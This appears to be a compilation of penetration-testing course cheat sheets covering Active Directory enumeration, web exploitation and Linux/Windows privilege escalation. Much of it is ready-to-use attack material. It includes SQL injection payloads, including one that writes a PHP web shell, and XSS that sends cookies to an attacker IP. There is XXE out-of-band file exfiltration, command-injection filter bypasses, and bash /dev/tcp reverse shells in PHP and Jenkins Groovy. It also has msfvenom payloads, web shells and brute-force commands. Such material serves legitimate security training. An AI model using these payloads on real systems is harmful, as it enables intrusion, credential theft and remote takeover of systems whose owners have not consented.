| `.\SharpView.exe Find-ManagedSecurityGroups` | List managed security groups |
| `Get-NetLocalGroup -ComputerName WS01` |  Get local groups on a host |
| `.\SharpView.exe Get-NetLocalGroupMember -ComputerName WS01` | Get members of a local group |
| `.\SharpView.exe Get-DomainComputer -Unconstrained` | Find computers that allow unconstrained delegation |
| `Get-DomainComputer -TrustedToAuth` | Find computers set with constrained delegation |
| `Get-DomainObjectAcl -Identity harry.jones` | Enumerate ACLs on a user |
| `Find-InterestingDomainAcl` | Find objects in the domain with modification rights over non built-in objects| 
| `Get-PathAcl "\\SQL01\DB_backups"` | Find the ACLs set on a directory |
| ` gpresult /r /S WS01` | Get a report of all GPOs applied to a host |
| ` Get-DomainGPO  \| Get-ObjectAcl` | Find GPO permissions |
| `Get-DomainTrustMapping` | Enumerate trusts for our domain/reachable domains |

## Active Directory BloodHound

### Cheatsheet

| **Command** | **Description** |
| --------------|-------------------|
| `xfreerdp /v:<target IP address> /u:htb-student /p:<password>` | RDP to lab target |
| `.\SharpHound.exe -c all --zipfilename inlanefreight_bloodhound` | Run the SharpHound C# ingestor |
| `Invoke-BloodHound -CollectionMethod all -ZipFileName ilfreight_bloodhound` | Run the SharpHound PowerShell ingestor |
| `bloodhound-python -dc <DC> -gc <GC> -d <DOMAIN -c All -u <user>` | Run bloodhound-python |
| `xfreerdp /v:10.129.2.43 /u:htb-student /drive:data,/tmp` | Transfer data to and from the target host with drive redirection|

# Web Exploitation

## 22. Using Web Proxies

### Cheatsheet

#### Burp Shortcuts

| **Shortcut**   | **Description**   |
| --------------|-------------------|
| [`CTRL+R`] | Send to repeater |
| [`CTRL+SHIFT+R`] | Go to repeater |
| [`CTRL+I`] | Send to intruder |
| [`CTRL+SHIFT+B`] | Go to intruder |
| [`CTRL+U`] | URL encode |
| [`CTRL+SHIFT+U`] | URL decode |

#### ZAP Shortcuts

| **Shortcut**   | **Description**   |
| --------------|-------------------|
| [`CTRL+B`] | Toggle intercept on/off |
| [`CTRL+R`] | Go to replacer |
| [`CTRL+E`] | Go to encode/decode/hash |

#### Firefox Shortcuts

| **Shortcut**   | **Description**   |
| --------------|-------------------|
| [`CTRL+SHIFT+R`] | Force Refresh Page |

## 23. Attacking Web Applications with Ffuf

### Cheatsheet

#### Ffuf

| **Command**   | **Description**   |
| --------------|-------------------|
| `ffuf -h` | ffuf help |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ` | Directory Fuzzing |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ` | Extension Fuzzing |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php` | Page Fuzzing |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v` | Recursive Fuzzing |
| `ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/` | Sub-domain Fuzzing |
| `ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx` | VHost Fuzzing |
| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx` | Parameter Fuzzing - GET |
| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` | Parameter Fuzzing - POST |
| `ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` | Value Fuzzing |  

#### Wordlists

| **Command**   | **Description**   |
| --------------|-------------------|
| `/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt` | Directory/Page Wordlist |
| `/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt` | Extensions Wordlist |
| `/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt` | Domain Wordlist |
| `/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt` | Parameters Wordlist |

#### Misc

| **Command**   | **Description**   |
| --------------|-------------------|
| `sudo sh -c 'echo "SERVER_IP  academy.htb" >> /etc/hosts'` | Add DNS entry |
| `for i in $(seq 1 1000); do echo $i >> ids.txt; done` | Create Sequence Wordlist |
| `curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'` | curl w/ POST |

## 24. Login Brute Forcing

### Cheatsheet

#### Hydra

| **Command**   | **Description**   |
| --------------|-------------------|
| `hydra -h` | hydra help |
| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - Combined Wordlist |
| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - User/Pass Wordlists |
| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Login Form Brute Force - Static User, Pass Wordlist |
| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH Brute Force - User/Pass Wordlists |
| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP Brute Force - Static User, Pass Wordlist |

#### Wordlists

| **Command**   | **Description**   |
| --------------|-------------------|
| `/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | Default Passwords Wordlist |
| `/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt` | Common Passwords Wordlist |
| `/opt/useful/SecLists/Usernames/Names/names.txt` | Common Names Wordlist |

#### Misc

| **Command**   | **Description**   |
| --------------|-------------------|
| `cupp -i` | Creating Custom Password Wordlist |
| `sed -ri '/^.{,7}$/d' william.txt` | Remove Passwords Shorter Than 8 |
| ```sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt``` | Remove Passwords With No Special Chars |
| `sed -ri '/[0-9]+/!d' william.txt` | Remove Passwords With No Numbers |
| `./username-anarchy Bill Gates > bill.txt` | Generate Usernames List |
| `ssh b.gates@SERVER_IP -p PORT` | SSH to Server |
| `ftp 127.0.0.1` | FTP to Server |
| `su - user` | Switch to User |

## 25. SQL Injection Fundamentals

### Cheatsheet

#### MySQL

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | login to mysql database |
| `SHOW DATABASES` | List available databases |
| `USE users` | Switch to database |
| **Tables** |
| `CREATE TABLE logins (id INT, ...)` | Add a new table |
| `SHOW TABLES` | List available tables in current database |
| `DESCRIBE logins` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values |
| **Columns** |
| `SELECT * FROM table_name` | Show all columns in a table |
| `SELECT column1, column2 FROM table_name` | Show specific columns in a table |
| `DROP TABLE logins` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT` | Add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE` | Change column datatype |
| `ALTER TABLE logins DROP oldColumn` | Delete column |
| **Output** |
| `SELECT * FROM logins ORDER BY column_1` | Sort by column |
| `SELECT * FROM logins ORDER BY column_1 DESC` | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns |
| `SELECT * FROM logins LIMIT 2` | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 |
| `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |

#### MySQL Operator Precedence

* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

#### SQL Injection

| **Payload**   | **Description**   |
| --------------|-------------------|
| **Auth Bypass** |
| `admin' or '1'='1` | Basic Auth Bypass |
| `admin')-- -` | Basic Auth Bypass With comments |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
| **Union Injection** |
| `' order by 1-- -` | Detect number of columns using `order by` |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
| **DB Enumeration** |
| `SELECT @@version` | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
| **Privileges** |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection** |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |

## 26. SQLMap Essentials

### Cheatsheet

| **Command**                                                  | **Description** |
| ------------------------------------------------------------ | ----------------------------------------------------------- |
| `sqlmap -h`                                                  | View the basic help menu |
| `sqlmap -hh`                                                 | View the advanced help menu |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`   | Run `SQLMap` without asking for user input |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`  | `SQLMap` with POST request |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'` | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt`                                          | Passing an HTTP request file to `SQLMap` |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` | Specifying a cookie header |
| `sqlmap -u www.target.com --data='id=1' --method PUT`        | Specifying a PUT request |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` | Store traffic to an output file |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch` | Specify verbosity level |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"` | Specifying a prefix or suffix |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`             | Specifying the level and risk |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` | Basic DB enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb` | Table enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname` | Table/row enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | Conditional enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --schema`          | Database schema enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`  | Searching for data |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch` | Password enumeration and cracking |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass |
| `sqlmap --list-tampers`                                      | List all tamper scripts |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba` | Check for DBA privileges |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"` | Reading a local file |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Writing a file |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`        | Spawning an OS shell |

## 27. Cross-Site Scripting (XSS)

### Cheatsheet

#### Commands

| Code | Description |
| ----- | ----- |
| **XSS Payloads** |
| `<script>alert(window.origin)</script>` | Basic XSS Payload |
| `<plaintext>` | Basic XSS Payload |
| `<script>print()</script>` | Basic XSS Payload |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |
| **Commands** |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80` | Start `netcat` listener |
| `sudo php -S 0.0.0.0:80 ` | Start `PHP` server |

## 28. File Inclusion
## 29. Command Injections

### Cheatsheet

**Injection Operators**

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
|-|-|-|-|
|Semicolon| `;`|`%3b`|Both|
|New Line| `\n`|`%0a`|Both|
|Background| `&`|`%26`|Both (second output generally shown first)|
|Pipe| `\|`|`%7c`|Both (only second output is shown)|
|AND| `&&`|`%26%26`|Both (only if first succeeds)|
|OR| `\|\|`|`%7c%7c`|Second (only if first fails)|
|Sub-Shell| ` `` `|`%60%60`|Both (Linux-only)|
|Sub-Shell| `$()`|`%24%28%29`|Both (Linux-only)|

#### Linux

##### Filtered Character Bypass

| Code | Description |
| ----- | ----- |
| `printenv` | Can be used to view all environment variables |
| **Spaces** |
| `%09` | Using tabs instead of spaces |
| `${IFS}` | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`) |
| `{ls,-la}` | Commas will be replaced with spaces |
| **Other Characters** |
| `${PATH:0:1}` | Will be replaced with `/` |
| `${LS_COLORS:10:1}` | Will be replaced with `;` |
| `$(tr '!-}' '"-~'<<<[)` | Shift character by one (`[` -> `\`) |


##### Blacklisted Command Bypass

| Code | Description |
| ----- | ----- |
| **Character Insertion** |
| `'` or `"` | Total must be even |
| `$@` or `\` | Linux only |
| **Case Manipulation** |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | Execute command regardless of cases |
| `$(a="WhOaMi";printf %s "${a,,}")` | Another variation of the technique |
| **Reversed Commands** |
| `echo 'whoami' \| rev` | Reverse a string |
| `$(rev<<<'imaohw')` | Execute reversed command |
| **Encoded Commands** |
| `echo -n 'cat /etc/passwd \| grep 33' \| base64` | Encode a string with base64 |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string |


#### Windows

##### Filtered Character Bypass

| Code | Description |
| ----- | ----- |
| `Get-ChildItem Env:` | Can be used to view all environment variables - (PowerShell) |
| **Spaces** |
| `%09` | Using tabs instead of spaces |
| `%PROGRAMFILES:~10,-5%` | Will be replaced with a space - (CMD) |
| `$env:PROGRAMFILES[10]` | Will be replaced with a space - (PowerShell) |
| **Other Characters** |
| `%HOMEPATH:~0,-17%` | Will be replaced with `\` - (CMD) |
| `$env:HOMEPATH[0]` | Will be replaced with `\` - (PowerShell) |


##### Blacklisted Command Bypass

| Code | Description |
| ----- | ----- |
| **Character Insertion** |
| `'` or `"` | Total must be even |
| `^` | Windows only (CMD) |
| **Case Manipulation** |
| `WhoAmi` | Simply send the character with odd cases |
| **Reversed Commands** |
| `"whoami"[-1..-20] -join ''` | Reverse a string |
| `iex "$('imaohw'[-1..-20] -join '')"` | Execute reversed command |
| **Encoded Commands** |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` | Encode a string with base64 |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string |

## 30. Web Attacks

### Cheatsheet

#### HTTP Verb Tampering

`HTTP Method`
- `HEAD`
- `PUT`
- `DELETE`
- `OPTIONS`
- `PATCH`

| **Command**   | **Description**   |
| --------------|-------------------|
| `-X OPTIONS` | Set HTTP Method with Curl |

#### IDOR

`Identify IDORS`
- In `URL parameters & APIs`
- In `AJAX Calls`
- By `understanding reference hashing/encoding`
- By `comparing user roles`

| **Command**   | **Description**   |
| --------------|-------------------|
| `md5sum` | MD5 hash a string |
| `base64` | Base64 encode a string |

#### XXE

| **Code**   | **Description**   |
| --------------|-------------------|
| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">` | Define External Entity to a URL |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Define External Entity to a file path |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter |
| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">` | Reading a file through a PHP error |
| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` | Reading a file OOB exfiltration |

## 31. Attacking Common Applications

### Cheatsheet

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo vim /etc/hosts`                                        | Opens the `/etc/hosts` with `vim` to start adding hostnames  |
| `sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list` | Runs an nmap scan using common web application ports based on a scope list (`scope_list`) and outputs to a file (`web_discovery`) in all formats (`-oA`) |
| `eyewitness --web -x web_discovery.xml -d <nameofdirectorytobecreated>` | Runs `eyewitness` using a file generated by an nmap scan (`web_discovery.xml`) and creates a directory (`-d`) |
| `cat web_discovery.xml \| ./aquatone -nmap`                  | Concatenates the contents of nmap scan output (web_discovery.xml) and pipes it (`|`) aquatone (`./aquatone`)and ensures aquatone recognizes the file as nmap scan output (`-nmap`) |
| `sudo wpscan --url <http://domainnameoripaddress> --enumerate` | Runs wpscan using the `--enmuerate` flag. Can replace the url with any valid and reachable URL in each challenge |
| `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://domainnameoripaddress>` | Runs wpscan and uses it to perform a password attack (`--password-attack`) against the specified url and references a word list (`/usr/share/wordlists/rockyou.txt`) |
| `curl -s http://<hostnameoripoftargetsite/path/to/webshell.php?cmd=id` | cURL command used to execute commands (`cmd=id`) on a vulnerable system utilizing a php-based webshell |
| `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip address of attack box>/<port of choice> 0>&1'");` | PHP code that will execute a reverse shell on a Linux-based system |
| `droopescan scan joomla --url http://<domainnameoripaddress>` | Runs `droopescan` against a joomla site located at the specified url |
| `sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr <username or path to username list>` | Runs joomla-brute.py tool with python3 against a specified url, utilizing a specified wordlist (`/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt`) and user or list of usernames (`-usr`) |
| `<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>` | PHP code that will allow for web shell access on a vulnerable drupal site. Can be used through browisng to the location of the file in the web directory after saving. Can also be leveraged utilizing curl. See next command. |
| `curl -s <http://domainname or IP address of site> /node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id \| grep uid \| cut -f4 -d">"` | Uses curl to navigate to php web shell file and run system commands (`=id`) on the target |
| `gobuster dir -u <http://domainnameoripaddressofsite> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt` | `gobuster` powered directory brute forcing attack refrencing a wordlist (`/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`) |
| `auxiliary/scanner/http/tomcat_mgr_login`                    | Useful Metasploit scanner module used to perform a bruteforce login attack against a tomcat site |
| `python3 mgr_brute.py -U <http://domainnameoripaddressofTomCatsite> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt` | Runs mgr_brute.py using python3 against the specified website starts in the /manager directory (`-P /manager`) and references a specified user or userlist ( `-u`) as well as a specified password or password list (`-p`) |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address of attack box> LPORT=<port to listen on to catch a shell> -f war > backup.war` | Generates a jsp-based reverse shell payload in the form of a .war file utilizing `msfvenom` |
| `nmap -sV -p 8009,8080 <domainname or IP address of tomcat site>` | Nmap scan useful in enumerating Apache Tomcat and AJP services |
| `r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 \| while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()` | Groovy-based reverse shell payload/code that can work with admin access to the `Script Console` of a `Jenkins` site. Will work when the underlying OS is Linux |
| `def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");` | Groovy-based payload/code that can work with admin access to the `Script Console` of a `Jenkins` site. This will allow webshell access and to execute commands on the underlying Windows system |
| `String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);` | Groovy-based reverse shell payload/code that can work with admin acess to the `Script Console` of a `Jenkins`site. Will work when the underlying OS is Windows |
| [reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk)              | A simple Splunk package for obtaining revershells on Windows and Linux systems |

## Bug Bounty Hunting Process
## Broken Authentication

### Cheatsheet

#### Fuzz

| **Command**   | **Description**   |
| --------------|-------------------|
| `wfuzz -z file,/path/to/wordlist.txt -u http://127.0.0.1:80/site/FUZZ` | Fuzz using a wordlist                   |
| `wfuzz -z file,/path/to/user.txt -z file,/path/to/pass.txt http://127.0.0.1/login.php -d "user=FUZZ&pass=FUZ2Z"` | Fuzz using POST method and two wordlists |
| `wfuzz -H Foo:FUZZ`                                          | Fuzz header                             |
| `-X GET , -X POST`                                           | Choose method                           |

#### Grep

| **Command**   | **Description**   |
| --------------|-------------------|
| `grep '[[:classname:]]' file.txt` | Find strings that contain a given class. Classes are: [[:graph:]], [[:lower:]], [[:print:]], [[:punct:]], [[:space:]], [[:upper:]], and [[:xdigit:]] |
| `grep -x '.\{123\}'`              | Find strings with length of 123   |

#### Misc

| **Command**   | **Description**   |
| --------------|-------------------|
| `echo -n academy \| xxd -p` | Convert hex to ASCII |
| `echo -n 61636164656d79 \| xxd -r -p` | Convert ASCII to hex |

CyberChef [https://gchq.github.io/CyberChef](https://gchq.github.io/CyberChef)

Decodify [https://github.com/s0md3v/Decodify](https://github.com/s0md3v/Decodify)

## File Upload Attacks

### Cheatsheet

#### Web Shells

| **Web Shell**   | **Description**   |
| --------------|-------------------|
| `<?php file_get_contents('/etc/passwd'); ?>` | Basic PHP File Read |
| `<?php system('hostname'); ?>` | Basic PHP Command Execution |
| `<?php system($_REQUEST['cmd']); ?>` | Basic PHP Web Shell |
| `<% eval request('cmd') %>` | Basic ASP Web Shell |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell |
| [PHP Web Shell](https://github.com/Arrexel/phpbash) | PHP Web Shell |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP Reverse Shell |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |

#### Bypasses

| **Command**   | **Description**   |
| --------------|-------------------|
| **Client-Side Bypass** |
| `[CTRL+SHIFT+C]` | Toggle Page Insepctor |
| **Blacklist Bypass** |
| `shell.phtml` | Uncommon Extension |
| `shell.pHp` | Case Manipulation |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions |
| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) | List of ASP Extensions |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) | List of Web Extensions |
| **Whitelist Bypass** |
| `shell.jpg.php` | Double Extension |
| `shell.php.jpg` | Reverse Double Extension |
| `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…` | Character Injection - Before/After Extension |
| **Content/Type Bypass** |
| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) | List of Web Content-Types |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | List of All Content-Types |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) | List of File Signatures/Magic Bytes |

#### Limited Uploads

| **Potential Attack**   | **File Types** |
| --------------|-------------------|
| `XSS` | HTML, JS, SVG, GIF |
| `XXE`/`SSRF` | XML, SVG, PDF, PPT, DOC |
| `DoS` | ZIP, JPG, PNG |

## Server-side Attacks
## Session Security
## Web Service & API Attacks

# Post-Exploitation

## 32. Linux Privilege Escalation

### Cheatsheet

| **Command** | **Description** |
| --------------|-------------------|
| `ssh htb-student@<target IP>` | SSH to lab target |
| `ps aux \| grep root` | See processes running as root |
| `ps au` | See logged in users |
| `ls /home` | View user home directories |
| `ls -l ~/.ssh` | Check for SSH keys for current user |
| `history` | Check the current user's Bash history |
| `sudo -l` | Can the user run anything as another user? |
| `ls -la /etc/cron.daily` | Check for daily Cron jobs |
| `lsblk` | Check for unmounted file systems/drives |
| `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null` | Find world-writeable directories |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null` | Find world-writeable files |
| `uname -a` | Check the Kernel version |
| `cat /etc/lsb-release ` | Check the OS version |
| `gcc kernel_expoit.c -o kernel_expoit` | Compile an exploit written in C |
| `screen -v` | Check the installed version of `Screen` |
| `./pspy64 -pf -i 1000` | View running processes with `pspy` |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` | Find binaries with the SUID bit set |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` | Find binaries with the SETGID bit set |
| `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` | Priv esc with `tcpdump` |
| `echo $PATH` | Check the current user's PATH variable contents |
| `PATH=.:${PATH}` | Add a `.` to the beginning of the current user's PATH |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null` | Search for config files |
| `ldd /bin/ls` | View the shared objects required by a binary |
| `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart` | Escalate privileges using `LD_PRELOAD` |
| `readelf -d payroll  \| grep PATH` | Check the RUNPATH of a binary |
| `gcc src.c -fPIC -shared -o /development/libshared.so` | Compiled a shared libary |
| `lxd init` | Start the LXD initialization process |
| `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine` | Import a local image |
| `lxc init alpine r00t -c security.privileged=true` | Start a privileged LXD container |
| `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true` | Mount the host file system in a container |
| `lxc start r00t` | Start the container |
| `showmount -e 10.129.2.12` | Show the NFS export list |
| `sudo mount -t nfs 10.129.2.12:/tmp /mnt` | Mount an NFS share locally |
| `tmux -S /shareds new -s debugsess` | Created a shared `tmux` session socket |
| `./lynis audit system` | Perform a system audit with `Lynis` |

## 33. Windows Privilege Escalation

### Cheatsheet

#### Initial Enumeration

| **Command** | **Description** |
| --------------|-------------------|
| `xfreerdp /v:<target ip> /u:htb-student` | RDP to lab target |
| `ipconfig /all`                                              | Get interface, IP address and DNS information  |
| `arp -a`                                                     | Review ARP table                               |
| `route print`                                                | Review routing table                           |
| `Get-MpComputerStatus`                                       | Check Windows Defender status                  |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections` | List AppLocker rules                           |
| `Get-AppLockerPolicy -Local \| Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone` | Test AppLocker policy                          |
| `set`                                                        | Display all environment variables              |
| `systeminfo`                                                 | View detailed system configuration information |
| `wmic qfe`                                                   | Get patches and updates                        |
| `wmic product get name`                                      | Get installed programs                         |
| `tasklist /svc`                                              | Display running processes                      |
| `query user`                                                 | Get logged-in users                            |
| `echo %USERNAME%`                                            | Get current user                               |
| `whoami /priv`                                               | View current user privileges                   |
| `whoami /groups`                                             | View current user group information            |
| `net user`                                                   | Get all system users                           |
| `net localgroup`                                             | Get all system groups                          |
| `net localgroup administrators`                              | View details about a group                     |
| `net accounts`                                               | Get passsword policy                           |
| `netstat -ano`                                               | Display active network connections             |
| `pipelist.exe /accepteula`                                   | List named pipes                               |
| `gci \\.\pipe\`                                              | List named pipes with PowerShell               |
